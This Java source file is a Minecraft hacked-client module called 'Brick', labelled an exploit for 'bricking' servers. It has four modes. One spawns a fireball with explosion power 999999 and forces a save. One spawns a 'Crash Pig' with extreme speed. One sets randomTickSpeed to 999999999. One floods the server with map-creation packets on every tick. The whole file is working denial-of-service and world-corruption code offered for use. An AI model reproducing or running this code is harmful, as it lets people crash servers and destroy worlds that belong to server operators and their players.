package net.shadow.feature.module;

import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.Identifier;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import net.minecraft.util.registry.Registry;
import net.shadow.Shadow;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.feature.configuration.MultiValue;

public class BrickThisModule extends Module { //mapfile brick, pigs + save brick, pigspawner brick


    final MultiValue mode = this.config.create("Mode", "Mapfile", "Mapfile", "Entity", "Fireball", "RandomTick");

    public BrickThisModule() {
        super("Brick", "brick the server", ModuleType.EXPLOIT);
    }

    @Override
    public String getVanityName() {
        return this.getName() + " [" + mode.getThis() + "]";
    }

    @Override
    public void onEnable() {
        switch (mode.getThis()) {
            case "Fireball" -> {
                Item item = Registry.ITEM.get(new Identifier("bat_spawn_egg"));
                ItemStack stack = new ItemStack(item, 1);
                ItemStack nana = Shadow.c.player.getMainHandStack();
                try {
                    stack.setNbt(StringNbtReader.parse("{display:{Name:'{\"text\":\"Server Stopped\",\"color\":\"gray\",\"bold\":true,\"italic\":false}'},EntityTag:{id:\"minecraft:fireball\",ExplosionPower:999999,direction:[0.0,-1.0,0.0],power:[0.0,-1.0,0.0]}}"));
                } catch (Exception ignored) {
                }
                BlockPos pos = new BlockPos(Shadow.c.player.getX(), Shadow.c.player.getY() - 1, Shadow.c.player.getZ());
                BlockHitResult hr = new BlockHitResult(new Vec3d(0, 0, 0), Direction.DOWN, pos, false);
                Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, stack));
                Shadow.c.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, hr));
                Shadow.c.player.sendChatMessage("/save-all flush");
                Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, nana));
                this.setEnabled(false);
            }
            case "Entity" -> {
                Item item4 = Registry.ITEM.get(new Identifier("bat_spawn_egg"));
                ItemStack stack4 = new ItemStack(item4, 1);
                ItemStack nana4 = Shadow.c.player.getMainHandStack();
                try {
                    stack4.setNbt(StringNbtReader.parse("{Enchantments:[{id:\"minecraft:unbreaking\",lvl:1s}],EntityTag:{Attributes:[{Base:999999,Name:\"generic.movement_speed\"}],id:\"minecraft:pig\"},HideFlags:127,display:{Lore:['{\"extra\":[{\"bold\":false,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false,\"color\":\"gray\",\"text\":\"Hold a carrot on a stick\"}],\"text\":\"\"}'],Name:'{\"extra\":[{\"bold\":false,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false,\"color\":\"dark_gray\",\"text\":\"Crash Pig\"}],\"text\":\"\"}'}}"));
                } catch (Exception ignored) {
                }
                BlockPos pos4 = new BlockPos(Shadow.c.player.getX(), Shadow.c.player.getY() - 1, Shadow.c.player.getZ());
                BlockHitResult hr4 = new BlockHitResult(new Vec3d(0, 0, 0), Direction.DOWN, pos4, false);
                Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, stack4));
                Shadow.c.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, hr4));
                Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, nana4));
                Shadow.c.player.sendChatMessage("/save-all flush");
                this.setEnabled(false);
            }
            case "RandomTick" -> {
                Shadow.c.player.sendChatMessage("/gamerule randomTickSpeed 999999999");
                this.setEnabled(false);
            }
        }
    }

    @Override
    public void onDisable() {
    }

    @Override
    public void onUpdate() {
        if (mode.getThis().equalsIgnoreCase("mapfile")) {
            ItemStack simpleair = new ItemStack(Items.AIR, 1);
            ItemStack map = new ItemStack(Items.MAP, 1);
            if (Shadow.c.player.getInventory().getStack(37).getItem() != Items.MAP) {
                Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(37, map));
            }
            Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(38, simpleair));
            Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(39, simpleair));
            Shadow.c.player.networkHandler.sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND));
            Shadow.c.player.networkHandler.sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND));
            Shadow.c.player.getInventory().selectedSlot = 1;
        }
    }

    @Override
    public void onRender() {

    }
}
